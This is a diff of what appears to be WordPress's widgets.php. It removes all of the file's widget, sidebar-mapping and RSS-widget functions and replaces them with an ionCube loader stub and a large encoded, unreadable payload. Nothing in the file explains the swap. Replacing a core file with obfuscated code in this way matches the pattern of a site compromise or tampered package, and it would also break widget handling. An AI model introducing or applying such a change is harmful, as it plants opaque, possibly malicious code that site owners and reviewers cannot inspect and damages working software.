- *                                 Default `</h2>`.
- * }
- */
-function the_widget( $widget, $instance = array(), $args = array() ) {
-	global $wp_widget_factory;
-
-	if ( ! isset( $wp_widget_factory->widgets[ $widget ] ) ) {
-		/* translators: %s: register_widget() */
-		_doing_it_wrong( __FUNCTION__, sprintf( __( 'Widgets need to be registered using %s, before they can be displayed.' ), '<code>register_widget()</code>' ), '4.9.0' );
-		return;
-	}
-
-	$widget_obj = $wp_widget_factory->widgets[$widget];
-	if ( ! ( $widget_obj instanceof WP_Widget ) ) {
-		return;
-	}
-
-	$default_args = array(
-		'before_widget' => '<div class="widget %s">',
-		'after_widget'  => "</div>",
-		'before_title'  => '<h2 class="widgettitle">',
-		'after_title'   => '</h2>',
-	);
-	$args = wp_parse_args( $args, $default_args );
-	$args['before_widget'] = sprintf( $args['before_widget'], $widget_obj->widget_options['classname'] );
-
-	$instance = wp_parse_args($instance);
-
-	/**
-	 * Fires before rendering the requested widget.
-	 *
-	 * @since 3.0.0
-	 *
-	 * @param string $widget   The widget's class name.
-	 * @param array  $instance The current widget instance's settings.
-	 * @param array  $args     An array of the widget's sidebar arguments.
-	 */
-	do_action( 'the_widget', $widget, $instance, $args );
-
-	$widget_obj->_set(-1);
-	$widget_obj->widget($args, $instance);
-}
-
-/**
- * Retrieves the widget ID base value.
- *
- * @since 2.8.0
- *
- * @param string $id Widget ID.
- * @return string Widget ID base.
- */
-function _get_widget_id_base( $id ) {
-	return preg_replace( '/-[0-9]+$/', '', $id );
-}
-
-/**
- * Handle sidebars config after theme change
- *
- * @access private
- * @since 3.3.0
- *
- * @global array $sidebars_widgets
- */
-function _wp_sidebars_changed() {
-	global $sidebars_widgets;
-
-	if ( ! is_array( $sidebars_widgets ) )
-		$sidebars_widgets = wp_get_sidebars_widgets();
-
-	retrieve_widgets(true);
-}
-
-/**
- * Look for "lost" widgets, this has to run at least on each theme change.
- *
- * @since 2.8.0
- *
- * @global array $wp_registered_sidebars
- * @global array $sidebars_widgets
- * @global array $wp_registered_widgets
- *
- * @param string|bool $theme_changed Whether the theme was changed as a boolean. A value
- *                                   of 'customize' defers updates for the Customizer.
- * @return array Updated sidebars widgets.
- */
-function retrieve_widgets( $theme_changed = false ) {
-	global $wp_registered_sidebars, $sidebars_widgets, $wp_registered_widgets;
-
-	$registered_sidebars_keys = array_keys( $wp_registered_sidebars );
-	$registered_widgets_ids   = array_keys( $wp_registered_widgets );
-
-	if ( ! is_array( get_theme_mod( 'sidebars_widgets' ) ) )  {
-		if ( empty( $sidebars_widgets ) ) {
-			return array();
-		}
-
-		unset( $sidebars_widgets['array_version'] );
-
-		$sidebars_widgets_keys = array_keys( $sidebars_widgets );
-		sort( $sidebars_widgets_keys );
-		sort( $registered_sidebars_keys );
-
-		if ( $sidebars_widgets_keys === $registered_sidebars_keys ) {
-			$sidebars_widgets = _wp_remove_unregistered_widgets( $sidebars_widgets, $registered_widgets_ids );
-
-			return $sidebars_widgets;
-		}
-	}
-
-	// Discard invalid, theme-specific widgets from sidebars.
-	$sidebars_widgets = _wp_remove_unregistered_widgets( $sidebars_widgets, $registered_widgets_ids );
-	$sidebars_widgets = wp_map_sidebars_widgets( $sidebars_widgets );
-
-	// Find hidden/lost multi-widget instances.
-	$shown_widgets = call_user_func_array( 'array_merge', $sidebars_widgets );
-	$lost_widgets  = array_diff( $registered_widgets_ids, $shown_widgets );
-
-	foreach ( $lost_widgets as $key => $widget_id ) {
-		$number = preg_replace( '/.+?-([0-9]+)$/', '$1', $widget_id );
-
-		// Only keep active and default widgets.
-		if ( is_numeric( $number ) && (int) $number < 2 ) {
-			unset( $lost_widgets[ $key ] );
-		}
-	}
-	$sidebars_widgets['wp_inactive_widgets'] = array_merge( $lost_widgets, (array) $sidebars_widgets['wp_inactive_widgets'] );
-
-	if ( 'customize' !== $theme_changed ) {
-		wp_set_sidebars_widgets( $sidebars_widgets );
-	}
-
-	return $sidebars_widgets;
-}
-
-/**
- * Compares a list of sidebars with their widgets against a whitelist.
- *
- * @since 4.9.0
- * @since 4.9.2 Always tries to restore widget assignments from previous data, not just if sidebars needed mapping.
- *
- * @param array $existing_sidebars_widgets List of sidebars and their widget instance IDs.
- * @return array Mapped sidebars widgets.
- */
-function wp_map_sidebars_widgets( $existing_sidebars_widgets ) {
-	global $wp_registered_sidebars;
-
-	$new_sidebars_widgets = array(
-		'wp_inactive_widgets' => array(),
-	);
-
-	// Short-circuit if there are no sidebars to map.
-	if ( ! is_array( $existing_sidebars_widgets ) || empty( $existing_sidebars_widgets ) ) {
-		return $new_sidebars_widgets;
-	}
-
-	foreach ( $existing_sidebars_widgets as $sidebar => $widgets ) {
-		if ( 'wp_inactive_widgets' === $sidebar || 'orphaned_widgets' === substr( $sidebar, 0, 16 ) ) {
-			$new_sidebars_widgets['wp_inactive_widgets'] = array_merge( $new_sidebars_widgets['wp_inactive_widgets'], (array) $widgets );
-			unset( $existing_sidebars_widgets[ $sidebar ] );
-		}
-	}
-
-	// If old and new theme have just one sidebar, map it and we're done.
-	if ( 1 === count( $existing_sidebars_widgets ) && 1 === count( $wp_registered_sidebars ) ) {
-		$new_sidebars_widgets[ key( $wp_registered_sidebars ) ] = array_pop( $existing_sidebars_widgets );
-
-		return $new_sidebars_widgets;
-	}
-
-	// Map locations with the same slug.
-	$existing_sidebars = array_keys( $existing_sidebars_widgets );
-
-	foreach ( $wp_registered_sidebars as $sidebar => $name ) {
-		if ( in_array( $sidebar, $existing_sidebars, true ) ) {
-			$new_sidebars_widgets[ $sidebar ] = $existing_sidebars_widgets[ $sidebar ];
-			unset( $existing_sidebars_widgets[ $sidebar ] );
-		} else if ( ! array_key_exists( $sidebar, $new_sidebars_widgets ) ) {
-			$new_sidebars_widgets[ $sidebar ] = array();
-		}
-	}
-
-	// If there are more sidebars, try to map them.
-	if ( ! empty( $existing_sidebars_widgets ) ) {
-
-		/*
-		 * If old and new theme both have sidebars that contain phrases
-		 * from within the same group, make an educated guess and map it.
-		 */
-		$common_slug_groups = array(
-			array( 'sidebar', 'primary', 'main', 'right' ),
-			array( 'second', 'left' ),
-			array( 'sidebar-2', 'footer', 'bottom' ),
-			array( 'header', 'top' ),
-		);
-
-		// Go through each group...
-		foreach ( $common_slug_groups as $slug_group ) {
-
-			// ...and see if any of these slugs...
-			foreach ( $slug_group as $slug ) {
-
-				// ...and any of the new sidebars...
-				foreach ( $wp_registered_sidebars as $new_sidebar => $args ) {
-
-					// ...actually match!
-					if ( false === stripos( $new_sidebar, $slug ) && false === stripos( $slug, $new_sidebar ) ) {
-						continue;
-					}
-
-					// Then see if any of the existing sidebars...
-					foreach ( $existing_sidebars_widgets as $sidebar => $widgets ) {
-
-						// ...and any slug in the same group...
-						foreach ( $slug_group as $slug ) {
-
-							// ... have a match as well.
-							if ( false === stripos( $sidebar, $slug ) && false === stripos( $slug, $sidebar ) ) {
-								continue;
-							}
-
-							// Make sure this sidebar wasn't mapped and removed previously.
-							if ( ! empty( $existing_sidebars_widgets[ $sidebar ] ) ) {
-
-								// We have a match that can be mapped!
-								$new_sidebars_widgets[ $new_sidebar ] = array_merge( $new_sidebars_widgets[ $new_sidebar ], $existing_sidebars_widgets[ $sidebar ] );
-
-								// Remove the mapped sidebar so it can't be mapped again.
-								unset( $existing_sidebars_widgets[ $sidebar ] );
-
-								// Go back and check the next new sidebar.
-								continue 3;
-							}
-						} // endforeach ( $slug_group as $slug )
-					} // endforeach ( $existing_sidebars_widgets as $sidebar => $widgets )
-				} // endforeach foreach ( $wp_registered_sidebars as $new_sidebar => $args )
-			} // endforeach ( $slug_group as $slug )
-		} // endforeach ( $common_slug_groups as $slug_group )
-	}
-
-	// Move any left over widgets to inactive sidebar.
-	foreach ( $existing_sidebars_widgets as $widgets ) {
-		if ( is_array( $widgets ) && ! empty( $widgets ) ) {
-			$new_sidebars_widgets['wp_inactive_widgets'] = array_merge( $new_sidebars_widgets['wp_inactive_widgets'], $widgets );
-		}
-	}
-
-	// Sidebars_widgets settings from when this theme was previously active.
-	$old_sidebars_widgets = get_theme_mod( 'sidebars_widgets' );
-	$old_sidebars_widgets = isset( $old_sidebars_widgets['data'] ) ? $old_sidebars_widgets['data'] : false;
-
-	if ( is_array( $old_sidebars_widgets ) ) {
-
-		// Remove empty sidebars, no need to map those.
-		$old_sidebars_widgets = array_filter( $old_sidebars_widgets );
-
-		// Only check sidebars that are empty or have not been mapped to yet.
-		foreach ( $new_sidebars_widgets as $new_sidebar => $new_widgets ) {
-			if ( array_key_exists( $new_sidebar, $old_sidebars_widgets ) && ! empty( $new_widgets ) ) {
-				unset( $old_sidebars_widgets[ $new_sidebar ] );
-			}
-		}
-
-		// Remove orphaned widgets, we're only interested in previously active sidebars.
-		foreach ( $old_sidebars_widgets as $sidebar => $widgets ) {
-			if ( 'orphaned_widgets' === substr( $sidebar, 0, 16 ) ) {
-				unset( $old_sidebars_widgets[ $sidebar ] );
-			}
-		}
-
-		$old_sidebars_widgets = _wp_remove_unregistered_widgets( $old_sidebars_widgets );
-
-		if ( ! empty( $old_sidebars_widgets ) ) {
-
-			// Go through each remaining sidebar...
-			foreach ( $old_sidebars_widgets as $old_sidebar => $old_widgets ) {
-
-				// ...and check every new sidebar...
-				foreach ( $new_sidebars_widgets as $new_sidebar => $new_widgets ) {
-
-					// ...for every widget we're trying to revive.
-					foreach ( $old_widgets as $key => $widget_id ) {
-						$active_key = array_search( $widget_id, $new_widgets, true );
-
-						// If the widget is used elsewhere...
-						if ( false !== $active_key ) {
-
-							// ...and that elsewhere is inactive widgets...
-							if ( 'wp_inactive_widgets' === $new_sidebar ) {
-
-								// ...remove it from there and keep the active version...
-								unset( $new_sidebars_widgets['wp_inactive_widgets'][ $active_key ] );
-							} else {
-
-								// ...otherwise remove it from the old sidebar and keep it in the new one.
-								unset( $old_sidebars_widgets[ $old_sidebar ][ $key ] );
-							}
-						} // endif ( $active_key )
-					} // endforeach ( $old_widgets as $key => $widget_id )
-				} // endforeach ( $new_sidebars_widgets as $new_sidebar => $new_widgets )
-			} // endforeach ( $old_sidebars_widgets as $old_sidebar => $old_widgets )
-		} // endif ( ! empty( $old_sidebars_widgets ) )
-
-
-		// Restore widget settings from when theme was previously active.
-		$new_sidebars_widgets = array_merge( $new_sidebars_widgets, $old_sidebars_widgets );
-	}
-
-	return $new_sidebars_widgets;
-}
-
-/**
- * Compares a list of sidebars with their widgets against a whitelist.
- *
- * @since 4.9.0
- *
- * @param array $sidebars_widgets List of sidebars and their widget instance IDs.
- * @param array $whitelist        Optional. List of widget IDs to compare against. Default: Registered widgets.
- * @return array Sidebars with whitelisted widgets.
- */
-function _wp_remove_unregistered_widgets( $sidebars_widgets, $whitelist = array() ) {
-	if ( empty( $whitelist ) ) {
-		$whitelist = array_keys( $GLOBALS['wp_registered_widgets'] );
-	}
-
-	foreach ( $sidebars_widgets as $sidebar => $widgets ) {
-		if ( is_array( $widgets ) ) {
-			$sidebars_widgets[ $sidebar ] = array_intersect( $widgets, $whitelist );
-		}
-	}
-
-	return $sidebars_widgets;
-}
-
-/**
- * Display the RSS entries in a list.
- *
- * @since 2.5.0
- *
- * @param string|array|object $rss RSS url.
- * @param array $args Widget arguments.
- */
-function wp_widget_rss_output( $rss, $args = array() ) {
-	if ( is_string( $rss ) ) {
-		$rss = fetch_feed($rss);
-	} elseif ( is_array($rss) && isset($rss['url']) ) {
-		$args = $rss;
-		$rss = fetch_feed($rss['url']);
-	} elseif ( !is_object($rss) ) {
-		return;
-	}
-
-	if ( is_wp_error($rss) ) {
-		if ( is_admin() || current_user_can('manage_options') )
-			echo '<p><strong>' . __( 'RSS Error:' ) . '</strong> ' . $rss->get_error_message() . '</p>';
-		return;
-	}
-
-	$default_args = array( 'show_author' => 0, 'show_date' => 0, 'show_summary' => 0, 'items' => 0 );
-	$args = wp_parse_args( $args, $default_args );
-
-	$items = (int) $args['items'];
-	if ( $items < 1 || 20 < $items )
-		$items = 10;
-	$show_summary  = (int) $args['show_summary'];
-	$show_author   = (int) $args['show_author'];
-	$show_date     = (int) $args['show_date'];
-
-	if ( !$rss->get_item_quantity() ) {
-		echo '<ul><li>' . __( 'An error has occurred, which probably means the feed is down. Try again later.' ) . '</li></ul>';
-		$rss->__destruct();
-		unset($rss);
-		return;
-	}
-
-	echo '<ul>';
-	foreach ( $rss->get_items( 0, $items ) as $item ) {
-		$link = $item->get_link();
-		while ( stristr( $link, 'http' ) != $link ) {
-			$link = substr( $link, 1 );
-		}
-		$link = esc_url( strip_tags( $link ) );
-
-		$title = esc_html( trim( strip_tags( $item->get_title() ) ) );
-		if ( empty( $title ) ) {
-			$title = __( 'Untitled' );
-		}
-
-		$desc = @html_entity_decode( $item->get_description(), ENT_QUOTES, get_option( 'blog_charset' ) );
-		$desc = esc_attr( wp_trim_words( $desc, 55, ' [&hellip;]' ) );
-
-		$summary = '';
-		if ( $show_summary ) {
-			$summary = $desc;
-
-			// Change existing [...] to [&hellip;].
-			if ( '[...]' == substr( $summary, -5 ) ) {
-				$summary = substr( $summary, 0, -5 ) . '[&hellip;]';
-			}
-
-			$summary = '<div class="rssSummary">' . esc_html( $summary ) . '</div>';
-		}
-
-		$date = '';
-		if ( $show_date ) {
-			$date = $item->get_date( 'U' );
-
-			if ( $date ) {
-				$date = ' <span class="rss-date">' . date_i18n( get_option( 'date_format' ), $date ) . '</span>';
-			}
-		}
-
-		$author = '';
-		if ( $show_author ) {
-			$author = $item->get_author();
-			if ( is_object($author) ) {
-				$author = $author->get_name();
-				$author = ' <cite>' . esc_html( strip_tags( $author ) ) . '</cite>';
-			}
-		}
-
-		if ( $link == '' ) {
-			echo "<li>$title{$date}{$summary}{$author}</li>";
-		} elseif ( $show_summary ) {
-			echo "<li><a class='rsswidget' href='$link'>$title</a>{$date}{$summary}{$author}</li>";
-		} else {
-			echo "<li><a class='rsswidget' href='$link'>$title</a>{$date}{$author}</li>";
-		}
-	}
-	echo '</ul>';
-	$rss->__destruct();
-	unset($rss);
-}
-
-/**
- * Display RSS widget options form.
- *
- * The options for what fields are displayed for the RSS form are all booleans
- * and are as follows: 'url', 'title', 'items', 'show_summary', 'show_author',
- * 'show_date'.
- *
- * @since 2.5.0
- *
- * @param array|string $args Values for input fields.
- * @param array $inputs Override default display options.
- */
-function wp_widget_rss_form( $args, $inputs = null ) {
-	$default_inputs = array( 'url' => true, 'title' => true, 'items' => true, 'show_summary' => true, 'show_author' => true, 'show_date' => true );
-	$inputs = wp_parse_args( $inputs, $default_inputs );
-
-	$args['title'] = isset( $args['title'] ) ? $args['title'] : '';
-	$args['url'] = isset( $args['url'] ) ? $args['url'] : '';
-	$args['items'] = isset( $args['items'] ) ? (int) $args['items'] : 0;
-
-	if ( $args['items'] < 1 || 20 < $args['items'] ) {
-		$args['items'] = 10;
-	}
-
-	$args['show_summary']   = isset( $args['show_summary'] ) ? (int) $args['show_summary'] : (int) $inputs['show_summary'];
-	$args['show_author']    = isset( $args['show_author'] ) ? (int) $args['show_author'] : (int) $inputs['show_author'];
-	$args['show_date']      = isset( $args['show_date'] ) ? (int) $args['show_date'] : (int) $inputs['show_date'];
-
-	if ( ! empty( $args['error'] ) ) {
-		echo '<p class="widget-error"><strong>' . __( 'RSS Error:' ) . '</strong> ' . $args['error'] . '</p>';
-	}
-
-	$esc_number = esc_attr( $args['number'] );
-	if ( $inputs['url'] ) :
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-	<p><label for="rss-url-<?php echo $esc_number; ?>"><?php _e( 'Enter the RSS feed URL here:' ); ?></label>
-	<input class="widefat" id="rss-url-<?php echo $esc_number; ?>" name="widget-rss[<?php echo $esc_number; ?>][url]" type="text" value="<?php echo esc_url( $args['url'] ); ?>" /></p>
-<?php endif; if ( $inputs['title'] ) : ?>
-	<p><label for="rss-title-<?php echo $esc_number; ?>"><?php _e( 'Give the feed a title (optional):' ); ?></label>
-	<input class="widefat" id="rss-title-<?php echo $esc_number; ?>" name="widget-rss[<?php echo $esc_number; ?>][title]" type="text" value="<?php echo esc_attr( $args['title'] ); ?>" /></p>
-<?php endif; if ( $inputs['items'] ) : ?>
-	<p><label for="rss-items-<?php echo $esc_number; ?>"><?php _e( 'How many items would you like to display?' ); ?></label>
-	<select id="rss-items-<?php echo $esc_number; ?>" name="widget-rss[<?php echo $esc_number; ?>][items]">
-	<?php
-	for ( $i = 1; $i <= 20; ++$i ) {
-		echo "<option value='$i' " . selected( $args['items'], $i, false ) . ">$i</option>";
-	}
-	?>
-	</select></p>
-<?php endif; if ( $inputs['show_summary'] ) : ?>
-	<p><input id="rss-show-summary-<?php echo $esc_number; ?>" name="widget-rss[<?php echo $esc_number; ?>][show_summary]" type="checkbox" value="1" <?php checked( $args['show_summary'] ); ?> />
-	<label for="rss-show-summary-<?php echo $esc_number; ?>"><?php _e( 'Display item content?' ); ?></label></p>
-<?php endif; if ( $inputs['show_author'] ) : ?>
-	<p><input id="rss-show-author-<?php echo $esc_number; ?>" name="widget-rss[<?php echo $esc_number; ?>][show_author]" type="checkbox" value="1" <?php checked( $args['show_author'] ); ?> />
-	<label for="rss-show-author-<?php echo $esc_number; ?>"><?php _e( 'Display item author if available?' ); ?></label></p>
-<?php endif; if ( $inputs['show_date'] ) : ?>
-	<p><input id="rss-show-date-<?php echo $esc_number; ?>" name="widget-rss[<?php echo $esc_number; ?>][show_date]" type="checkbox" value="1" <?php checked( $args['show_date'] ); ?>/>
-	<label for="rss-show-date-<?php echo $esc_number; ?>"><?php _e( 'Display item date?' ); ?></label></p>
-<?php
-	endif;
-	foreach ( array_keys($default_inputs) as $input ) :
-		if ( 'hidden' === $inputs[$input] ) :
-			$id = str_replace( '_', '-', $input );
-?>
-	<input type="hidden" id="rss-<?php echo esc_attr( $id ); ?>-<?php echo $esc_number; ?>" name="widget-rss[<?php echo $esc_number; ?>][<?php echo esc_attr( $input ); ?>]" value="<?php echo esc_attr( $args[ $input ] ); ?>" />
-<?php
-		endif;
-	endforeach;
-}
-
-/**
- * Process RSS feed widget data and optionally retrieve feed items.
- *
- * The feed widget can not have more than 20 items or it will reset back to the
- * default, which is 10.
- *
- * The resulting array has the feed title, feed url, feed link (from channel),
- * feed items, error (if any), and whether to show summary, author, and date.
- * All respectively in the order of the array elements.
- *
- * @since 2.5.0
- *
- * @param array $widget_rss RSS widget feed data. Expects unescaped data.
- * @param bool $check_feed Optional, default is true. Whether to check feed for errors.
- * @return array
- */
-function wp_widget_rss_process( $widget_rss, $check_feed = true ) {
-	$items = (int) $widget_rss['items'];
-	if ( $items < 1 || 20 < $items )
-		$items = 10;
-	$url           = esc_url_raw( strip_tags( $widget_rss['url'] ) );
-	$title         = isset( $widget_rss['title'] ) ? trim( strip_tags( $widget_rss['title'] ) ) : '';
-	$show_summary  = isset( $widget_rss['show_summary'] ) ? (int) $widget_rss['show_summary'] : 0;
-	$show_author   = isset( $widget_rss['show_author'] ) ? (int) $widget_rss['show_author'] :0;
-	$show_date     = isset( $widget_rss['show_date'] ) ? (int) $widget_rss['show_date'] : 0;
-
-	if ( $check_feed ) {
-		$rss = fetch_feed($url);
-		$error = false;
-		$link = '';
-		if ( is_wp_error($rss) ) {
-			$error = $rss->get_error_message();
-		} else {
-			$link = esc_url(strip_tags($rss->get_permalink()));
-			while ( stristr($link, 'http') != $link )
-				$link = substr($link, 1);
-
-			$rss->__destruct();
-			unset($rss);
-		}
-	}
-
-	return compact( 'title', 'url', 'link', 'items', 'error', 'show_summary', 'show_author', 'show_date' );
-}
-
-/**
- * Registers all of the default WordPress widgets on startup.
- *
- * Calls {@see 'widgets_init'} action after all of the WordPress widgets have been registered.
- *
- * @since 2.2.0
- */
-function wp_widgets_init() {
-	if ( ! is_blog_installed() ) {
-		return;
-	}
-
-	register_widget( 'WP_Widget_Pages' );
-
-	register_widget( 'WP_Widget_Calendar' );
-
-	register_widget( 'WP_Widget_Archives' );
-
-	if ( get_option( 'link_manager_enabled' ) ) {
-		register_widget( 'WP_Widget_Links' );
-	}
-
-	register_widget( 'WP_Widget_Media_Audio' );
-
-	register_widget( 'WP_Widget_Media_Image' );
-
-	register_widget( 'WP_Widget_Media_Gallery' );
-
-	register_widget( 'WP_Widget_Media_Video' );
-
-	register_widget( 'WP_Widget_Meta' );
-
-	register_widget( 'WP_Widget_Search' );
-
-	register_widget( 'WP_Widget_Text' );
-
-	register_widget( 'WP_Widget_Categories' );
-
-	register_widget( 'WP_Widget_Recent_Posts' );
-
-	register_widget( 'WP_Widget_Recent_Comments' );
-
-	register_widget( 'WP_Widget_RSS' );
-
-	register_widget( 'WP_Widget_Tag_Cloud' );
-
-	register_widget( 'WP_Nav_Menu_Widget' );
-
-	register_widget( 'WP_Widget_Custom_HTML' );
-
-	/**
-	 * Fires after all default WordPress widgets have been registered.
-	 *
-	 * @since 2.2.0
-	 */
-	do_action( 'widgets_init' );
-}
+HR+cPp7UiCYC2mdlEfObwx/PbB0Tut0Alp4/V/2G0i6Hzg8XXfaV23hUWDrhhQDOpSTQQWXvXtAX
+nCWWB5hHaeN5p5qLltY1X8ijINtjh9PsXgopMHVLFb5qIQUUylNP9eF4LCos6hRFdSgSNzWlxjrA
+BTcAnUpCXW8GTLy+LnGRz1h0NlpCWZqsdHLDzNS6MO7Wr3+M3N4UlADnwIv8OBYCrdiqsn6wKtOU
+qsWbX3fUncswVS2gNEYD04Zd5X9qajBxsaNvz0kr7LyqadEJAM2d2x3dVhzhdbQ05ZV9fKdLUxnY
+YZecw8TK5tHx46/8XJl7Nt+Ryc6KOILSwa4MrzQQxC4RrayhOLTHLFs7J9uM5mCI1r23y4F7SGEI
+eiugDsS96n8k8vgdwgZe6Ru/mf/gnGaG6KKwNxaOci7uLBxNHIpwSG1XZFteAz0CMZrcTlK3JcMA
+LgA5ip9Ql6poCWyWuMYn671Xs7jVUPfQ/QNIuf9iESyOckJGK4+PTEkzUpF51IiwYwlnhB+DKdD5
+XaDzHrDz7UMpqCTvW25XUJdThoEdFlxIiuN6St0UAf8LqNyWWEnpakuYH+6OTJAlqlXzOyjt1sah
+bZMu4zlwxxaWg/7n/3wMWbUJXf26Az5e2DAfEb7I9auG7o8dN86ri/tEYKg7nXorpK4PJCO6386O
+OkfGwDw6+rXJLPNT5+OO9R/MmfEVw3ViqlkEK/IObH/zQhYCkxczNgw4uX03sQjYz9YkzyU/eOXh
+YjrBquM3ZgkfNDqDIB3PxhqULoNGspRE1sby5XR5tDulYAdWGwypl8N/oE6HQEv58Wh44+qm/tv5
+73vYVQOubh8f3Z1JaS6aaYyr/hGG1NvZ6OaeFuV4Xg8c3/9ZVwytl7VsJUM+8ov5UN8LU55YwAJ2
+f/jvs4DqiYQ7Yo+84bdH9LGCdzJoEDFn1tpSzS5354sTyhYC8gAjyJM9SPi0iuVgHl7KjUmoz5eu
+4FSGZ8O+UKs2EmSKQgq1Vqh83RXVPsc6c7+bltUgxp5hBE/Q6V9wtFj8+UKeR/1pyLpXjWkpi3xV
+yk8Wv6T20GnMc62SYZPY2pRlap0eYoeSqjy5Pu8T30hQGfsHvMLQYknhCKedPCnEK0RFWvEmSGiw
+USJDSXKJlM1scqLEj+r+4iJZd+XHSA5KP3wVbulrGOOaNfrAV/MFlg79n33vgT2qkam6GkuqMxGT
+GAHzn+6kXdvD9uqTilzzjFfwgjBRrIDr+Qy67P5gNrIJMvANpVdsJlliEOQ39JAYbxBkMamVINQV
+UO3V/cC8IrZgNRuo0CLLazOO2ItBK9kVc98F3mXnx+NKJUB8POf9VNAOdAZZzlgf20KqrtQqmG6u
+mMZ9GP+R8J//Du4vGbw2yrRZd/sINrvymVKwX62bqBVTD2AWX6CUpqPh69+809k+FS90TPWkIIbV
+m4jM9U+AXbcOEPMKrB18Pszj0Bww4u2NrXM2YWttriWd5AUm1Z7g/f3R5Ayd1WnGAXD4Lz+Zd1+S
+Wy2666CSNY9rnPzso06GNxqYgKcVgLLYTkd+R0HTlpH4vrDaj23A8C69EqPrz7TfIr1ytEBloh7d
+tKugOUWVgAtx/tvj1d4FPtJoBKv7MjOP4OswxK1cdLdfwBf5DwotVCpYjKyOzhSG0f76HwyUcYhy
+ewLCGsy6xLwFRcGvsN/qZgPHsUz6+XhjoqYlXNHvDFYtDEEO2PTfgrtDKW6camWpXiMIDiGHYw1l
+n6Oiix19ZiZ+L09+9mbZdko2XK0iSEtMMbEKygNldx48q0hfAwekYv3CrSO6JFIb1HGSDJreqMYS
+jRtUwPfATkpNMHL0AuNVFp4wahIqLuEX/o5HEL0cr4/ln6iT8frkU8bcuMe30rh+adtazDi7YQRN
+pq0468jdQ/mtNpbPPcPfeEe1YJvuASpG47KK+f+gzieacVNAYa7rE+UnOoFtJiqd9GTCjCGjraJx
+c+j5qMWDcAvRFQZwqhPqPA9OplAg7ztnVNl5dadC8NhSW1ZG+DCekF2yS8hBWGy9RZsiZY5mBChT
+hR8IcXYxUacX2IglAs9X7nQUuwb6Pgc2ue8wLpi8B6VEwpZ1WcVxldt82+VmV1U1upBV2/eS+8Ez
+tzEFDpI+RmCILDEyvkgqGgS2DIliluJPeWoCUnz9nfkHGa8KmMMMtJXtlfEDn2I3qc+LxvkrDlyg
+Sj5P3omP5+VJsKi3e5Ya80nVaJYByCZVI2iXV+zGtnNa8kyb9wYRjMi20Kx11L4tcnkihO+ReN1h
+q2lB04WO9qFC1fZJwkpqrJAjLeyKNsFwdfkReX6y3IC8+UYNRisXSNgj+qClAL66S6pgWgk3xbLR
+J9l0AkYejnF94Gww5dCb4FMFLZHVRrNUau+YZ5tR1/gZ+6N/4RqJKMryr6CZ43J/neamRi6pWe5G
+wIgZlM4pNZuFCcY0cc8HQrHj7RTSLqc58xXJYRDfYpktdwEftHukvoK66BfZJl0Dz4JQC6IpPZa+
+Tx/VW/ipufzQEMQMSse+pJU4XqF8livGvkhZcrMvH2ezow6Bzg/VdOxyeZ75J1gZyDspLCdiFV5/
+5QlO4FRqukalAQSXBjFrzwZ/0F1oYwxf5uUmeSnM+ziUwygwu+18zChDklAACpIYKzqdfnYQX43X
+sxvVCCwUYgBa9aHvYLjv1dsUqdYZfCORyZyMZUUGyQQiOPZuGJPv2Ckj0qptTDxLsBUMNreqoXfb
+J7wd+pu0YudPoTA93rOM2sRVKVz66DLt0n0ieLkgCLAjJPzrEvXaVRdw/OHg7P4w6G8/cjTK/Mr+
+Y0FHYMjsD52RvZXRgQn4b16vh4rkwIViRoV4OBtgdjV42wHHFOSOxhlIbT/VGJ8G2B2OvQbzfVLu
+DB1YmH+Kfpwr6rnKUQbkC0K6ADKDCbcooCHiHwQwVAn11iSYtWsSFhfFCm+NXIvmqD/Ewu694G+p
+2Ufsh1FuCAYDZWN/5we64yY615HhBv1hDTB2mIrmZRwkSK5tdlktSFAAs2IMhb93lKG/d5JBG84L
+bHZOyME1GC1juNzVWVl1+eCYzV/C90pKolVmXdjZh7nijr/jmQUC0qyw1PtM8oy792gw/E7q9djx
+rVksOpgdpMP/OWhgTEnDRBEsOd2IIYZqsx2wLOTxJDexH1hRQEBFwspw5gy0qyhpVB4YnnFdCZtc
+B5lLKZFlacvvNBTY75oVGBRBOhh8icttObAOEIovS40POOt2HcB83LobtvsSXud0B3Jda/J3lClI
+B28sH6P65hQTWBYN2h5A6Wed0wCNkGA+wEZk6LGZhOuvmqqtb5NSnZQJoYWdRQFdQwOIkiqnBnqv
+4miU2AZIFGR7ynJ8H6f050Ek/tFJU6pV7g1i8NtfqLAnXA2NBAHuepgc/zw3+piWB81rJVHMHJhW
++LMvS/auDnI5gtQ6A3RHtJ2mI2wBT3V/6Y+Tq3keSaXny4MZ1uE2+jfZgNK282TldRrZyhUOfcOg
+7g/XNjZbCPGAAmsGvEe+3x3dK/qWQ7/Mv5G0VU93P/SA1cxKhlJXeJXWR7J+Ih/iHDhQiuKG78ct
+vpTECQlDT+zE8I+rGDTl1PjcVjW/19hDUFBBkoYBlW7XATdIT+hsnqfTmTzAAx73QnmEKzaQRTun
+onQ7bmnakhlQ9pbfmXcajfhrJuvD5LoDXKafYXs/NJv41arHVsmkYfc2fUQ+4ejb5OKs1xs59Da+
+Zc36MkBiqUNCAkGSpaRNL1Ip5q5Nng3T25B/1f1IrcTq4EHYC9pW+2usJStSpMeIfHgj7/+Nw+bm
+Qr7lKiZNk37zu+j2XzKB7c9jLzTP0dzaPGuY1XkiHAnSjMurnTEjzQZ6LSsx+ohpx0Zlbs1YYJk/
